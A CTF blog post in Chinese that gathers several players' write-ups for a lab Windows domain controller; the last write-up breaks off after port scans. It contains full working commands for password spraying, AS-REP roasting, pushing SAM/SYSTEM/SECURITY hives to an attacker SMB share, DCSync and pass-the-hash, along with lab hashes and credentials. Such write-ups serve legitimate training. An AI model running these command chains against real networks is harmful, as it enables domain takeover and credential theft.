---
title: Poloras-BabyDC-Unexpected
description: '个人出题-选手WriteUp'
pubDate: 2026-03-30
image: /game/bloodhound.jpg
categories:
  - Documentation
  - CTF
tags:
  - CTF
  - Windows Machine
---
![](/image/myself%20machine/Castlevania-Unexpected-1.png)

# **<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Wh1teSu（域用户-弱口令）</font>**
## <font style="color:rgb(51, 51, 51);">结论</font>
<font style="color:rgb(51, 51, 51);">这题的核心利用链是：</font>

1. <font style="color:rgb(51, 51, 51);">通过 Kerberos 用户枚举拿到一批有效用户名</font>
2. <font style="color:rgb(51, 51, 51);">用弱口令喷洒拿到低权限域用户</font>
3. <font style="color:rgb(51, 51, 51);">用 BloodHound 数据确认 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 开启 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Do not require Kerberos preauthentication</font>`<font style="color:rgb(51, 51, 51);">，且属于 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`
4. <font style="color:rgb(51, 51, 51);">对 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 做 AS-REP Roast，爆破出密码 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">1maxwell</font>`
5. <font style="color:rgb(51, 51, 51);">结合 GitHub MCP 查到的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">backup_dc_registry</font>`<font style="color:rgb(51, 51, 51);"> 思路，利用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">reg.py backup</font>`<font style="color:rgb(51, 51, 51);"> 让域控把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SAM/SYSTEM/SECURITY</font>`<font style="color:rgb(51, 51, 51);"> 直接备份到 Kali 的 SMB 共享</font>
6. <font style="color:rgb(51, 51, 51);">从离线 hive 提取出域控机器账户 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">CASTLEVANIA$</font>`<font style="color:rgb(51, 51, 51);"> 的 NTLM</font>
7. <font style="color:rgb(51, 51, 51);">使用机器账户做 DCSync，拿到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 哈希</font>
8. <font style="color:rgb(51, 51, 51);">PTH 到目标主机，成功获得 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> shell</font>

<font style="color:rgb(51, 51, 51);">题目要求是“拿到 Administrator 的 shell 即可”，到第 8 步已经满足。</font>

---

## <font style="color:rgb(51, 51, 51);">目标信息</font>
<font style="color:rgb(51, 51, 51);">已知开放端口如下：</font>

53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 1433, 3268, 3269, 9389

<font style="color:rgb(51, 51, 51);">进一步探测：</font>

```plain
nmap -sV -sC -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,9389 192.168.56.105
```

<font style="color:rgb(51, 51, 51);">关键结果：</font>

> Host: CASTLEVANIA.XMCVE.local
>
> Domain: XMCVE.local
>
> 80/tcp: IIS 10
>
> 1433/tcp: Microsoft SQL Server 2016
>

<font style="color:rgb(51, 51, 51);">HTTP 首页只有一个维护页面：</font>

> CASTLEVANIA Portal
>
> Employee Portal
>
> Under maintenance...
>

<font style="color:rgb(51, 51, 51);">说明真正入口大概率不在 Web，而是在 AD 身份面。</font>

---

## <font style="color:rgb(51, 51, 51);">1. 用户枚举与口令喷洒</font>
<font style="color:rgb(51, 51, 51);">先用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">kerbrute</font>`<font style="color:rgb(51, 51, 51);"> 跑一轮常见用户名：</font>

```plain
kerbrute userenum -d XMCVE.local --dc 192.168.56.105 /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

<font style="color:rgb(51, 51, 51);">命中的有效用户包括：</font>

```plain
admin
sales
support
administrator
Admin
alucard
```

<font style="color:rgb(51, 51, 51);">接着做一轮最常见弱口令喷洒：</font>

```plain
kerbrute passwordspray -d XMCVE.local --dc 192.168.56.105 valid_users.txt 'Password123!'
```

<font style="color:rgb(51, 51, 51);">命中结果：</font>

```plain
admin:Password123!
sales:Password123!
support:Password123!
Admin:Password123!
```

<font style="color:rgb(51, 51, 51);">这一步只拿到了普通域账号，没有直接管理权限。</font>

---

## <font style="color:rgb(51, 51, 51);">2. BloodHound 找真正突破口</font>
<font style="color:rgb(51, 51, 51);">用已知凭据采集 BloodHound 数据：</font>

```plain
bloodhound-python -u admin -p 'Password123!' -d XMCVE.local -dc CASTLEVANIA.XMCVE.local -ns 192.168.56.105 -c All --zip
```

<font style="color:rgb(51, 51, 51);">在采集结果里，关键用户是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">MOWEN@XMCVE.LOCAL</font>`<font style="color:rgb(51, 51, 51);">。</font>

<font style="color:rgb(51, 51, 51);">已验证到的关键属性：</font>

```plain
dontreqpreauth: true
serviceprincipalnames: HTTP/CASTLEVANIA.XMCVE.local
member of: BACKUP OPERATORS
```

<font style="color:rgb(51, 51, 51);">同时还能看到：</font>

ALUCARD@XMCVE.LOCAL -> member of local Administrators

<font style="color:rgb(51, 51, 51);">但 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">alucard</font>`<font style="color:rgb(51, 51, 51);"> 当前没有口令，暂时走不通。</font>

<font style="color:rgb(51, 51, 51);">因此最优路径变成：</font>

+ <font style="color:rgb(51, 51, 51);">先打 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 的 AS-REP Roast</font>
+ <font style="color:rgb(51, 51, 51);">再利用其 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 权限打域控</font>

---

## <font style="color:rgb(51, 51, 51);">3. AS-REP Roast 拿下 mowen</font>
<font style="color:rgb(51, 51, 51);">因为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 开启了“不需要预认证”，可以直接请求 AS-REP：</font>

impacket-GetNPUsers XMCVE.local/mowen -dc-ip 192.168.56.105 -no-pass -request

<font style="color:rgb(51, 51, 51);">拿到哈希后用 John 爆破：</font>

```plain
john mowen.asrep --wordlist=/usr/share/wordlists/rockyou.txt
john --show mowen.asrep
```

<font style="color:rgb(51, 51, 51);">爆破结果：</font>

mowen:1maxwell

<font style="color:rgb(51, 51, 51);">至此得到可用凭据：</font>

XMCVE.local\mowen : 1maxwell

---

## <font style="color:rgb(51, 51, 51);">4. 用 mowen 做资产验证</font>
<font style="color:rgb(51, 51, 51);">先看 SMB 权限：</font>

nxc smb 192.168.56.105 -u mowen -p '1maxwell' -d XMCVE.local --shares

<font style="color:rgb(51, 51, 51);">已验证结果：</font>

```plain
ADMIN$    READ
C$        READ,WRITE
IPC$      READ
NETLOGON  READ
SYSVOL    READ
```

<font style="color:rgb(51, 51, 51);">但常规远程执行并不通：</font>

```plain
atexec.py ...
wmiexec.py ...
psexec.py ...
```

<font style="color:rgb(51, 51, 51);">结果分别遇到：</font>

```plain
rpc_s_access_denied
ADMIN$/C$ not writable enough for service drop
```

<font style="color:rgb(51, 51, 51);">说明 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 的价值不是直接执行，而是其 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 身份。</font>

<font style="color:rgb(51, 51, 51);">顺手还从站点目录里发现了一个低价值 SQL 凭据：</font>

```plain
C:\inetpub\wwwroot\poo_connection.txt
server=localhost;
user=wuwupor;
password=lovlyBaby
database=master
```

<font style="color:rgb(51, 51, 51);">验证后发现 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor</font>`<font style="color:rgb(51, 51, 51);"> 只是低权限 SQL 登录：</font>

```plain
SYSTEM_USER = wuwupor
IS_SRVROLEMEMBER('sysadmin') = 0
xp_cmdshell denied
```

<font style="color:rgb(51, 51, 51);">因此 MSSQL 这条线是干扰项，不是正解。</font>

---

## <font style="color:rgb(51, 51, 51);">5. GitHub MCP 确认 Backup Operators 利用法</font>
<font style="color:rgb(51, 51, 51);">这里我没有凭记忆硬打，而是用 GitHub MCP 查公开实现。</font>

<font style="color:rgb(51, 51, 51);">检索后定位到：</font>

horizon3ai/backup_dc_registry

<font style="color:rgb(51, 51, 51);">仓库 README 明确说明：</font>

abuses Backup Operator privileges to remote dump SAM, SYSTEM, and SECURITY hives

<font style="color:rgb(51, 51, 51);">其核心用法是：</font>

python3 reg.py user:pass@dc backup -p '\\attacker\share'

<font style="color:rgb(51, 51, 51);">再对照本机 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">reg.py -h</font>`<font style="color:rgb(51, 51, 51);">，确认当前环境中的 Impacket 已内置 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">backup</font>`<font style="color:rgb(51, 51, 51);"> 动作，且参数形式为：</font>

reg.py 'domain/user:pass@target' backup -o '\\attacker\share'

<font style="color:rgb(51, 51, 51);">这一步非常关键，因为之前如果把输出写成本地目录，命令会失败；正确思路是让目标机把 hive 备份到攻击机暴露的 UNC 路径。</font>

---

## <font style="color:rgb(51, 51, 51);">6. 让域控反向备份注册表 hive 到 Kali</font>
<font style="color:rgb(51, 51, 51);">先在 Kali 上起一个 SMB 接收共享：</font>

```plain
mkdir -p /tmp/regshare
smbserver.py -smb2support -ip 192.168.56.101 share /tmp/regshare
```

<font style="color:rgb(51, 51, 51);">我的 Kali 在目标网段的地址是：</font>

192.168.56.101

<font style="color:rgb(51, 51, 51);">然后直接执行备份：</font>

reg.py 'XMCVE.local/mowen:1maxwell@192.168.56.105' -dc-ip 192.168.56.105 backup -o '\\192.168.56.101\share'

<font style="color:rgb(51, 51, 51);">已验证输出：</font>

```plain
[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \\192.168.56.101\share\SAM.save
[*] Saved HKLM\SYSTEM to \\192.168.56.101\share\SYSTEM.save
[*] Saved HKLM\SECURITY to \\192.168.56.101\share\SECURITY.save
```

<font style="color:rgb(51, 51, 51);">共享目录落地成功：</font>

```plain
/tmp/regshare/SAM.save
/tmp/regshare/SYSTEM.save
/tmp/regshare/SECURITY.save
```

---

## <font style="color:rgb(51, 51, 51);">7. 离线提取机器账户哈希</font>
<font style="color:rgb(51, 51, 51);">对回传的 hive 做离线 secretsdump：</font>

secretsdump.py -sam /tmp/regshare/SAM.save -system /tmp/regshare/SYSTEM.save -security /tmp/regshare/SECURITY.save LOCAL

<font style="color:rgb(51, 51, 51);">关键结果有两个：</font>

1. <font style="color:rgb(51, 51, 51);">本地 SAM 里的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 哈希</font>
2. <font style="color:rgb(51, 51, 51);">更重要的域控机器账户 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">$MACHINE.ACC</font>`

<font style="color:rgb(51, 51, 51);">提取结果中的核心值：</font>

$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7ca8289eae8ab9490db2bfee75bc0d78

<font style="color:rgb(51, 51, 51);">因为目标本身是域控，机器账户 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">CASTLEVANIA$</font>`<font style="color:rgb(51, 51, 51);"> 属于 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Domain Controllers</font>`<font style="color:rgb(51, 51, 51);">，天然具备目录复制能力，所以这一步足够直接推进到 DCSync。</font>

<font style="color:rgb(51, 51, 51);">先验证机器账户哈希可用：</font>

```plain
nxc smb 192.168.56.105 -u 'CASTLEVANIA$' -H '7ca8289eae8ab9490db2bfee75bc0d78' -d XMCVE.local
```

<font style="color:rgb(51, 51, 51);">结果：</font>

[+] XMCVE.local\CASTLEVANIA$:7ca8289eae8ab9490db2bfee75bc0d78

---

## <font style="color:rgb(51, 51, 51);">8. 用机器账户做 DCSync 拿 Administrator</font>
<font style="color:rgb(51, 51, 51);">接着直接用机器账户哈希做 DCSync：</font>

```plain
secretsdump.py -just-dc-user Administrator -hashes ':7ca8289eae8ab9490db2bfee75bc0d78' 'XMCVE.local/CASTLEVANIA$@192.168.56.105' -dc-ip 192.168.56.105
```

<font style="color:rgb(51, 51, 51);">成功回显：</font>

```plain
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
```

<font style="color:rgb(51, 51, 51);">至此得到：</font>

XMCVE.local\Administrator NTLM = d94f9831271e229dbc6e712097b63168

---

## <font style="color:rgb(51, 51, 51);">9. PTH 获取 Administrator shell</font>
<font style="color:rgb(51, 51, 51);">最后直接 PTH：</font>

```plain
wmiexec.py -hashes ':d94f9831271e229dbc6e712097b63168' 'XMCVE.local/Administrator@192.168.56.105' 'whoami /all'
```

<font style="color:rgb(51, 51, 51);">已验证输出中的关键部分：</font>

```plain
User Name
xmcve\administrator
```

<font style="color:rgb(51, 51, 51);">以及高权限组：</font>

```plain
XMCVE\Domain Admins
XMCVE\Enterprise Admins
XMCVE\Schema Admins
BUILTIN\Administrators
```

<font style="color:rgb(51, 51, 51);">这说明已经稳定取得 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> shell，题目完成。</font>

---

## <font style="color:rgb(51, 51, 51);">最终利用链复盘</font>
<font style="color:rgb(51, 51, 51);">这题的设计点其实很明确：</font>

+ <font style="color:rgb(51, 51, 51);">弱口令只是入口，不是终点</font>
+ <font style="color:rgb(51, 51, 51);">真正核心是 BloodHound 给出的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen -> Backup Operators + no preauth</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 在域控上非常危险，因为它能把注册表 hive 备份出来</font>
+ <font style="color:rgb(51, 51, 51);">一旦拿到域控机器账户 hash，就能直接 DCSync</font>
+ <font style="color:rgb(51, 51, 51);">DCSync 之后再 PTH 到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);">，整条链就闭环了</font>

<font style="color:rgb(51, 51, 51);">最短路径可以概括成一句话：</font>

弱口令域用户 -> BloodHound 定位 mowen -> AS-REP Roast -> Backup Operators 远程导出 hive -> 机器账户 hash -> DCSync -> PTH Administrator

---

## <font style="color:rgb(51, 51, 51);">关键命令汇总</font>
```plain
# 用户枚举
kerbrute userenum -d XMCVE.local --dc 192.168.56.105 users.txt

# 弱口令喷洒
kerbrute passwordspray -d XMCVE.local --dc 192.168.56.105 valid_users.txt 'Password123!'

# BloodHound 采集
bloodhound-python -u admin -p 'Password123!' -d XMCVE.local -dc CASTLEVANIA.XMCVE.local -ns 192.168.56.105 -c All --zip

# AS-REP Roast
impacket-GetNPUsers XMCVE.local/mowen -dc-ip 192.168.56.105 -no-pass -request
john mowen.asrep --wordlist=/usr/share/wordlists/rockyou.txt

# 起 SMB 接收共享
smbserver.py -smb2support -ip 192.168.56.101 share /tmp/regshare

# 远程导出 hive
reg.py 'XMCVE.local/mowen:1maxwell@192.168.56.105' -dc-ip 192.168.56.105 backup -o '\\192.168.56.101\share'

# 离线提取
secretsdump.py -sam /tmp/regshare/SAM.save -system /tmp/regshare/SYSTEM.save -security /tmp/regshare/SECURITY.save LOCAL

# 机器账户 DCSync
secretsdump.py -just-dc-user Administrator -hashes ':7ca8289eae8ab9490db2bfee75bc0d78' 'XMCVE.local/CASTLEVANIA$@192.168.56.105' -dc-ip 192.168.56.105

# PTH 验证 Administrator shell
wmiexec.py -hashes ':d94f9831271e229dbc6e712097b63168' 'XMCVE.local/Administrator@192.168.56.105' 'whoami /all'
```

# <font style="color:rgb(0, 0, 0);">Lkin（</font><font style="color:#333333;">本地挂载</font><font style="color:rgb(0, 0, 0);">）</font>
## 解题思路
通过离线挂载域控硬盘提取 AD 凭据，再利用 Pass-the-Hash 攻击直接以管理员身份登录靶机，最终获得 `nt authority\system` 权限。

## 解题过程
### 1. 挂载硬盘并提取 NTDS 数据库
将 Windows 域控的虚拟硬盘挂载到 Kali Linux，复制 AD 数据库文件：

>  `ntds.dit`：Active Directory 数据库，存储所有域用户的凭据 Hash  
- `SYSTEM`：注册表 Hive，包含解密 ntds.dit 所需的 BootKey
>

```plain
sudo cp /mnt/win/Windows/NTDS/ntds.dit ~/Desktop/
sudo cp /mnt/win/Windows/System32/config/SYSTEM ~/Desktop/
```

### 2. 离线提取域用户 Hash
使用 `impacket-secretsdump` 离线解密 ntds.dit：

> 关键发现：Administrator 与 Alucard 共享同一个 NT Hash，多个普通用户也共享同一个 Hash，说明存在弱密码策略。
>

```plain
sudo impacket-secretsdump -ntds ~/Desktop/ntds.dit -system ~/Desktop/SYSTEM LOCAL
```

| 成功提取所有域用户的 NT Hash：   Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::   Alucard:1000:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::   XMCVE.local\p2zhh:1104:::bc2bf43119e258bcecf71d44abc29db7:::   XMCVE.local\mowen:1105:::efb5fa49a38497a71e144f690860688e:::   XMCVE.local\sales/support/it/hr/admin:共享 hash 2b576acbe6bcfda7294d6bd18041b8fe   XMCVE.local\sqlsvc:1112:::d93ef04edb808c5bce3a5bd67b936ca9::: |
| :--- |


### 3. 确定靶机 IP
将硬盘放回靶机，两台 VM 网络均改为桥接模式，启动后在 Kali 中扫描：

> 发现靶机 IP：`192.168.81.124`（MAC: 08:00:27:65:5F:89，VirtualBox NIC）
>

| nmap -sn 192.168.81.0/24 |
| :--- |


### 4. Pass-the-Hash 攻击
WinRM 端口（5985/5986）被防火墙过滤，改用 `impacket-psexec` 进行 Pass-the-Hash：

> Pass-the-Hash 原理：Windows NTLM 认证使用 NT Hash 直接计算响应值，无需明文密码即可通过认证。
>

```plain
impacket-psexec Administrator@192.168.81.124 \
  -hashes aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168
```

成功获得 Shell：

![](/image/myself%20machine/Castlevania-Unexpected-2.png)

### 5. 权限确认
```plain
whoami
```

![](/image/myself%20machine/Castlevania-Unexpected-3.png)

![](/image/myself%20machine/Castlevania-Unexpected-4.png)

## 攻击链
```plain
挂载硬盘 → 提取 NTDS → 获取 NT Hash → Pass-the-Hash → SYSTEM 权限
```

## 最终权限
> 域控完全沦陷
>

### 本地
nt authority\system

### 域内
Domain Admins + Enterprise Admins + Schema Admins

# NikoCat<font style="color:rgb(0, 0, 0);">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font>
## 端口扫描
```plain
[731ms]     已选择服务扫描模式
[731ms]     开始信息扫描
[731ms]     最终有效主机数量: 1
[731ms]     开始主机扫描
[731ms]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[737ms]     有效端口数量: 65535
[748ms] [*] 端口开放 192.168.56.101:389
[753ms] [*] 端口开放 192.168.56.101:139
[754ms] [*] 端口开放 192.168.56.101:593
[755ms] [*] 端口开放 192.168.56.101:80
[755ms] [*] 端口开放 192.168.56.101:445
[755ms] [*] 端口开放 192.168.56.101:88
[755ms] [*] 端口开放 192.168.56.101:53
[755ms] [*] 端口开放 192.168.56.101:135
[755ms] [*] 端口开放 192.168.56.101:464
[3.7s] [*] 端口开放 192.168.56.101:636
[6.8s] [*] 端口开放 192.168.56.101:1433
[15.8s] [*] 端口开放 192.168.56.101:3268
[15.8s] [*] 端口开放 192.168.56.101:3269
[45.8s] [*] 端口开放 192.168.56.101:9389
[4m6s] [*] 端口开放 192.168.56.101:49668
[4m6s] [*] 端口开放 192.168.56.101:49671
[4m6s] [*] 端口开放 192.168.56.101:49690
[4m6s] [*] 端口开放 192.168.56.101:49670
[5m6s] [*] 端口开放 192.168.56.101:61436
[5m30s]     扫描完成, 发现 19 个开放端口
[5m30s]     存活端口数量: 19
[5m30s]     开始漏洞扫描
[5m30s] [*] 网站标题 http://192.168.56.101     状态码:200 长度:157    标题:CASTLEVANIA Portal
[5m30s] [*] NetInfo 扫描结果
目标主机: 192.168.56.101
主机名: CASTLEVANIA
发现的网络接口:
   IPv4地址:
      └─ 192.168.56.101
[5m30s] [+] NetBios 192.168.56.101  DC:XMCVE\CASTLEVANIA
[5m30s]     POC加载完成: 总共387个，成功387个，失败0个
[5m31s]     扫描已完成: 13/13
```

没洞啊？只能从IIS突破一下

dirsearch没结果

## IIS
搜索半天发现神秘工具 iis_shortname_scan.py

房主有神器

```plain
Server is vulnerable, please wait, scanning...
[+] /i~1.*      [scan in progress]
[+] /p~1.*      [scan in progress]
[+] /in~1.*     [scan in progress]
[+] /po~1.*     [scan in progress]
[+] /ind~1.*    [scan in progress]
[+] /poo~1.*    [scan in progress]
[+] /inde~1.*   [scan in progress]
[+] /poo_~1.*   [scan in progress]
[+] /index~1.*  [scan in progress]
[+] /poo_c~1.*  [scan in progress]
[+] /poo_co~1.* [scan in progress]
[+] /poo_co~1.t*        [scan in progress]
[+] /poo_co~1.tx*       [scan in progress]
[+] /poo_co~1.txt*      [scan in progress]
[+] File /poo_co~1.txt* [Done]

0 Directories, 1 Files found in total
Note that * is a wildcard, matches any character zero or more times.
```

也就是说有个叫/poo_co~1.txt*的东西，但是我们不知道具体的文件名无法下载

直接上bing搜索，发现神秘复现文章 [https://snowscan.io/htb-writeup-poo/#](https://snowscan.io/htb-writeup-poo/#)

![](/image/myself%20machine/Castlevania-Unexpected-5.png)

虽然我没有fuzz，但是我有搜索引擎，所以我获得了神秘的poo_connection.txt

```plain
server=localhost;
user=wuwupor;
password=lovlyBaby
database=master
```

## MSSQL
入侵神秘数据库，用户本身只是普通public权限，但是发现存在linked server数据库

![](/image/myself%20machine/Castlevania-Unexpected-6.png)

看一下在poo_public的权限

![](/image/myself%20machine/Castlevania-Unexpected-7.png)

在POO_PUBLIC上用户被映射为sa

试试命令执行

![](/image/myself%20machine/Castlevania-Unexpected-8.png)

可以直接命令执行，手动编译一个vshell，注意这里只能反连（因为有域防火墙）。vshell默认的脚本放的public文件夹，数据库用户访问不了。

## 域内用户
上线以后看一下域内用户

![](/image/myself%20machine/Castlevania-Unexpected-9.png)

这个mowen用户和p2zhh用户有点说法，拿出来进行一个smb爆破

挂了快一个小时，爆出来了。当然这里可以直接上msf马，当时糖了

![](/image/myself%20machine/Castlevania-Unexpected-10.png)

由于没开远程桌面，直接登录

![](/image/myself%20machine/Castlevania-Unexpected-11.png)

## Msfconsole
上一个msf马，依旧反连，而且莫名其妙地只能打上x32的马，x64的马就是出不来

![](/image/myself%20machine/Castlevania-Unexpected-12.png)

use post/multi/recon/local_exploit_suggester

扫出来一坨

![](/image/myself%20machine/Castlevania-Unexpected-13.png)

## <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font>
使用cve_2020_0787的exp

由于靶机患了抑郁症，x64的反连shell一直打不出来，只能直接传exp上去了

这里使用 [https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION](https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION) 即可一把梭

![](/image/myself%20machine/Castlevania-Unexpected-14.png)

此处获得了system shell，相当于已经有管理员权限

# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">onehang</font><font style="color:#333333;"> （</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">           </font>
## <font style="color:#333333;">信息收集                                           </font>
### <font style="color:#333333;">端口扫描                                                   </font>
<font style="color:#333333;">先</font><font style="color:#333333;">ipconfig</font><font style="color:#333333;">看一下启动的靶机的地址，得到</font><font style="color:#333333;">host-only</font><font style="color:#333333;">的网卡</font><font style="color:#333333;">IP</font><font style="color:#333333;">是</font><font style="color:#333333;">192.168.56.1</font><font style="color:#333333;">，说明靶机在</font><font style="color:#333333;">192.168.56.0/24</font><font style="color:#333333;">网段 </font><font style="color:#333333;">nmap</font><font style="color:#333333;">扫一下</font>

```plain
┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
└─# nmap -sn 192.168.56.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-2820:35 CST
Nmap scan report for[1].168.56.1 Host is up (0.00044s latency).
Nmap scan report for192.168.56.100 Host is up (0.00063s latency).
Nmap scan report for192.168.56.103 Host is up (0.0015s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in16.51 seconds
```

<font style="color:#333333;">发现了两个目标：</font>

> <font style="color:#333333;">SMB签名： 已启用且强制</font>
>
> <font style="color:#333333;">有两个重要的攻击面：Web 网站和 MSSQL。</font>
>

```plain
┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
└─# nmap -sV -sC -p- --min-rate 5000 192.168.56.103
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-2820:36 CST
Nmap scan report for[2].168.56.103 Host is up (0.00062s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods:
|_  Potentially risky methods: TRACE
|_http-title: CASTLEVANIA Portal
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-2812:37:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: XMCVE.local, Site: Default-
First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 201613.00.5026.00; SP2
|_ssl-date: 2026-03-28T12:38:38+00:00; 0s from scanner time.
| ms-sql-ntlm-info:
|   192.168.56.103:1433: |     Target_Name: XMCVE
|     NetBIOS_Domain_Name: XMCVE
|     NetBIOS_Computer_Name: CASTLEVANIA
|     DNS_Domain_Name: XMCVE.local
|     DNS_Computer_Name: CASTLEVANIA.XMCVE.local
|     DNS_Tree_Name: XMCVE.local
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-28T12:32:49
|_Not valid after:  2056-03-28T12:32:49 | ms-sql-info:
|   192.168.56.103:1433:
|     Version:
|       name: Microsoft SQL Server 2016 SP2
|       number: 13.00.5026.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: SP2
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: XMCVE.local, Site: Default-
First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASTLEVANIA; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time:
|   date: 2026-03-28T12:37:58
|_  start_date: N/A | smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_nbstat: NetBIOS name: CASTLEVANIA, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:7d:4a:d4 (PCS 
Systemtechnik/Oracle VirtualBox virtual NIC)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in120.46 seconds
```

| <font style="color:#333333;">主机名</font> | <font style="color:#333333;">CASTLEVANIA</font> |
| --- | --- |
| <font style="color:#333333;">域名</font> | <font style="color:#333333;">XMCVE.local</font> |
| <font style="color:#333333;">FQDN</font> | <font style="color:#333333;">CASTLEVANIA.XMCVE.local</font> |
| <font style="color:#333333;">操作系统</font> | <font style="color:#333333;">Windows Server 2019</font> |
| <font style="color:#333333;">关键服务</font> | **<font style="color:#333333;">IIS </font>****<font style="color:#333333;">网站</font>****<font style="color:#333333;">(80)</font>**<font style="color:#333333;">, </font>**<font style="color:#333333;">MSSQL 2016(1433)</font>**<font style="color:#333333;">, AD</font><font style="color:#333333;">域控</font><font style="color:#333333;">(88/389/445)</font> |


### <font style="color:#333333;">添加 hosts 并查看网站</font>
> <font style="color:#333333;">没有什么信息</font>
>

```plain
